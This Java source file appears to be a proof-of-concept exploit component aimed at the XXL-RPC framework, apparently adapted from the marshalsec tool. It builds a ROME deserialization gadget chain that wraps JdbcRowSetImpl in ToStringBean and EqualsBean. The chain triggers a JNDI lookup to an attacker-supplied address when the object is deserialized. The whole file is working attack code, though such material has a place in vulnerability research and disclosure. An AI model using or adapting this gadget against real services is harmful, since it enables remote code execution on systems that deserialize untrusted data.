package com.xxl.rpc.core.poc;

import com.rometools.rome.feed.impl.EqualsBean;
import com.rometools.rome.feed.impl.ToStringBean;
import com.sun.rowset.JdbcRowSetImpl;

/**
 * @author mbechler
 *
 */
public interface Rome extends Gadget {


    default Object makeRome (UtilFactory uf, String[] args ) throws Exception {
        return makeROMEAllPropertyTrigger(uf, JdbcRowSetImpl.class, JDKUtil.makeJNDIRowSet(args[ 0 ]));
    }




    default <T> Object makeROMEAllPropertyTrigger (UtilFactory uf, Class<T> type, T obj ) throws Exception {
        ToStringBean item = new ToStringBean(type, obj);
        EqualsBean root = new EqualsBean(ToStringBean.class, item);
        return uf.makeHashCodeTrigger(root);
    }
}
